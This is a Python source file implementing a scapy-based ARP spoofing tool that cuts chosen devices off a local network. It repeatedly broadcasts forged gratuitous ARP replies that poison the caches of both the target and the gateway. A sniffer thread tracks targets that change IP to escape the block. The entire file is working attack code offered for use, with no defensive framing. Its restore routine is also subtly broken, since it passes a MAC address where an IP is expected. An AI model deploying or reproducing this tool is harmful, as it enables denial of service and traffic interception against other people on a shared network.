from scapy.all import ARP, Ether, srp, sendp, conf, sniff
from threading import Thread, Lock
from time import time, sleep
from src.ping import get_default_gateway


class GarpSpoofer:
    def __init__(self):
        # Initialize the GarpSpoofer class
        self.gateway_ip = get_default_gateway()
        self.gateway_mac = self.resolve_mac(self.gateway_ip)
        self.targets = {}
        self.lock = Lock()
        self.active = True
        conf.verb = 0

        # Start monitoring thread to detect ARP requests
        Thread(target=self.monitor_arp, daemon=True).start()
        # Start spoofing thread to send GARP packets
        Thread(target=self.spoof_engine, daemon=True).start()

    def resolve_mac(self, ip):
        # Resolves the MAC address for a given IP address using ARP requests
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                          timeout=2, verbose=0)
            return ans[0][1].hwsrc if ans else None
        except Exception as e:
            print(f"MAC resolution failed for {ip}: {e}")
            return None

    def craft_garp(self, ip, mac):
        # Crafts a Gratuitous ARP (GARP) packet to announce or update
        # the association between an IP address and a MAC address
        return Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2,  # ARP response
            psrc=ip,
            hwsrc=mac,
            pdst=ip  # GARP characteristic
        )

    def monitor_arp(self):
        # Monitors ARP traffic on the network to detect anti-ARP spoofing mechanisms
        def arp_handler(pkt):
            if ARP in pkt and pkt[ARP].op == 1: 
                with self.lock:
                    for target in self.targets.values():
                        if pkt[ARP].hwsrc == target['real_mac']:
                            new_ip = pkt[ARP].psrc
                            if new_ip == "0.0.0.0":
                                # print(f"Detected invalid IP {new_ip} for {target['real_mac']}.")
                                continue

                            if new_ip != target['ip']:
                                print(f"Anti-ARP spoofing detected for {target['real_mac']}. New IP: {new_ip}")
                                target['ip'] = new_ip
                                target['last_request'] = time()

        # Sniff ARP packets and process them using the arp_handler
        sniff(prn=arp_handler, filter="arp", store=0)

    def spoof_engine(self):
        # Continuously sends GARP packets to maintain the spoofing state
        while self.active:
            with self.lock:
                targets = list(self.targets.values())

            for target in targets:
                # Send GARP packets in bursts for reliability
                for _ in range(3):
                    gateway_garp = self.craft_garp(self.gateway_ip, target['spoof_mac'])
                    target_garp = self.craft_garp(target['ip'], self.gateway_mac)
                    sendp([gateway_garp, target_garp], verbose=0)
                    sleep(0.1)  # Short delay between bursts

                # Update the last GARP time
                target['last_garp'] = time()

            sleep(0.5)  # Base interval between spoofing cycles

    def block_device(self, ip, mac):
        # Blocks a device by adding it to the targets dictionary and initiating spoofing
        with self.lock:
            if mac in [t['real_mac'] for t in self.targets.values()]:
                print(f"Device with MAC {mac} is already blocked")
                return

            if not self.validate_target(ip, mac):
                print(f"Validation failed for {ip} ({mac})")
                return

            self.targets[mac] = {
                'ip': ip,
                'real_mac': mac,
                'spoof_mac': conf.iface.mac,
                'last_garp': 0,
                'last_request': time()
            }
            print(f"Blocking {ip} ({mac})")

    def validate_target(self, ip, mac):
        # Validates a target by ensuring the MAC address matches the IP address
        current_mac = self.resolve_mac(ip)
        if current_mac and current_mac.lower() != mac.lower():
            print(f"MAC mismatch for {ip} (expected {mac}, got {current_mac})")
            return False
        return True

    def restore_device(self, mac):
        # Restores a device by removing it from the targets dictionary and sending corrective GARP packets
        with self.lock:
            target = self.targets.pop(mac, None)
            if not target:
                print(f"Device with MAC {mac} not blocked")
                return

            current_ip = self.resolve_mac(target['real_mac'])
            if current_ip and current_ip != target['ip']:
                print(f"Device {mac} changed IP from {target['ip']} to {current_ip}")
                target['ip'] = current_ip

        # Send corrective GARP packets to restore the original state
        real_gateway_garp = self.craft_garp(self.gateway_ip, self.gateway_mac)
        real_target_garp = self.craft_garp(target['ip'], target['real_mac'])

        for _ in range(3):
            sendp([real_gateway_garp, real_target_garp], verbose=0)
            sleep(0.25)

        print(f"Restored {target['ip']} ({mac})")

    def __del__(self):
        # Cleans up by restoring all targets when the object is deleted
        self.active = False
        for mac in list(self.targets.keys()):
            self.restore_device(mac)